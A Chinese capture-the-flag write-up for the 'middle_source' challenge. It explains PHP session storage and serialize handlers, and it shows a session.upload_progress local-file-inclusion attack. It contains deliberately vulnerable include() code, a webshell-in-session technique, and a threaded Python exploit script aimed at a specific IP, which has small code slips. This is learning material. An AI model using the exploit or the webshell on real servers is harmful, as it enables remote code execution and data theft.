# middle_source

打开环境，看到源码，应该文件包含，然后扫一下后台扫出来

```
[23:24:39] 200 -  208B  - /.listing
```

可以发现`you_can_seeeeeeee_me.php`是一个`phpinfo`文件

![](https://zhuang-yongyi.gitee.io/yoyo/nep/middle_source/1.png)

在这里可以看到session的存储位置，还看到了`session.upload_progress`为ON，所以这里可以利用`session.upload_progress`进行文件包含。

## 原理

### 用户会话session的存储与处理过程

**会话存储**

`PHP`则是将session以文件的形式存储在服务器某个文件中，可以在`php.ini`里面设置session的存储位置`session.save_path`。

可以通过phpinfo查看`session.save_path`的值

总结常见的php-session默认存放位置是很有必要的，因为在很多时候服务器都是按照默认设置来运行的，这个时候假如我们发现了一个没有安全措施的session包含漏洞就可以尝试利用默认的会话存放路径去包含利用。

```
默认路径
/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
```

如果某个服务器存在session包含漏洞，要想去成功的包含利用的话，首先必须要知道的是服务器是如何存放该文件的，只要知道了其命名格式我们才能够正确的去包含该文件。

`session`的文件名格式为`sess_[phpsessid]`。而phpsessid在发送的请求的cookie字段中可以看到。



**会话处理**

在了解了用户会话的存储下来就需要了解php是如何处理用户的会话信息。php中针对用户会话的处理方式主要取决于服务器在php.ini或代码中对`session.serialize_handler`的配置。

**session.serialize_handler**

PHP中处理用户会话信息的主要是下面定义的两种方式

```
session.serialize_handler = php           一直都在(默认方式)  它是用 |分割

session.serialize_handler = php_serialize  php5.5之后启用 它是用serialize反序列化格式分割
```

**session.serialize_handler=php**

服务器在配置文件或代码里面没有对session进行配置的话，PHP默认的会话处理方式就是`session.serialize_handler=php`这种模式机制。

下面通过一个简单的用户会话过程了解`session.serialize_handler=php`是如何工作的。

![](https://zhuang-yongyi.gitee.io/yoyo/nep/middle_source/2.png)

![](https://zhuang-yongyi.gitee.io/yoyo/nep/middle_source/3.png)

从图中可以看到默认`session.serialize_handler=php`处理模式只对用户名的内容进行了序列化存储，没有对变量名进行序列化，可以看作是服务器对用户会话信息的半序列化存储过程。

如果这里传入的不是Qftm，而是一句话木马，就会造成文件上传漏洞。

![](https://zhuang-yongyi.gitee.io/yoyo/nep/middle_source/4.png)

**session.serialize_handler=php_serialize**

php5.5之后启用这种处理模式，它是用serialize反序列化格式进行存储用户的会话信息。一样的通过一个简单的用户会话过程了解`session.serialize_handler=php_serialize`是如何工作的。这种模式可以在php.ini或者代码中进行设置。

session.php

```php
<?php
    ini_set('session.serialize_handler', 'php_serialize');    
    session_start();
    $username = $_POST['username'];
    $_SESSION["username"] = $username;

?>
```

![](https://zhuang-yongyi.gitee.io/yoyo/nep/middle_source/5.png)

## LFI本地文件包含漏洞

主要是包含本地服务器上存储的一些文件，例如Session会话文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。

session文件包含漏洞就是在用户可以控制session文件中的一部分信息，然后将这部分信息变成我们的精心构造的恶意代码，之后去包含含有我们传入恶意代码的这个session文件就可以达到攻击效果。

### 测试代码

session.php

```php
<?php

    session_start();
    $username = $_POST['username'];
    $_SESSION["username"] = $username;

?>
```

index.php

```php
<?php

    $file  = $_GET['file'];
    include($file);

?>
```

### 漏洞利用

分析session.php可以看到用户会话信息username的值用户是可控的，因为服务器没有对该部分作出限制。那么我们就可以传入恶意代码就行攻击利用。

首先查看session.save_path保存的地址

![](https://zhuang-yongyi.gitee.io/yoyo/nep/middle_source/6.png)

在session.php传入一句话木马

![](https://zhuang-yongyi.gitee.io/yoyo/nep/middle_source/7.png)

查看sessionid

![](https://zhuang-yongyi.gitee.io/yoyo/nep/middle_source/8.png)

包含sess_sessionid这个文件，文件的内容为我们传入的一句话木马

![](https://zhuang-yongyi.gitee.io/yoyo/nep/middle_source/9.png)

综上，通过文件上传恶意的sess_sessionid文件造成文件上传漏洞，之间访问sess_sessionid验证这个漏洞。

![](https://zhuang-yongyi.gitee.io/yoyo/nep/middle_source/10.png)

从中也可以发现，文件包含漏洞包含的文件的类型没有限制。无论是sess_sessionid文件还是txt文件等任意文件类型均可。

![](https://zhuang-yongyi.gitee.io/yoyo/nep/middle_source/11.png)

```php
import io
import requests
import threading
sessid = 'SsBNMsssSssssL'
data = {"cmd":"system('cat flag.php');"}
def write(session):
 while True:
  f = io.BytesIO(b'a' * 1024 * 50)
  resp = session.post('http://124.71.233.92:20988/', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php var_dump(scandir("/etc/");?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )
  #readfile("etc/hfhajdgdcd/defcheebfe/abfihbefda/fdbdahacif/ajddhaeaab/fl444444g")
def read(session):
 while True:
  data={
  'filed':'',
  'cf':'../../../../../..//var/lib/php/sessions/hceffdjaee/sess_'+sessid
  }
  resp = session.post('http://124.71.233.92:20988/index.php',data=data)
  if 'tgao.txt' in resp.text:
   print(resp.text)
   event.clear()
  else:
   print("[+++++++++++++]retry")
if __name__=="__main__":
 event=threading.Event()
 with requests.session() as session:
  for i in range(1,30): 
   threading.Thread(target=write,args=(session,)).start()
  for i in range(1,30):
   threading.Thread(target=read,args=(session,)).start()
 event.set()
```

等有环境再继续复现。

# 参考文章

https://www.anquanke.com/post/id/201177#h3-2

https://www.freebuf.com/news/202819.html

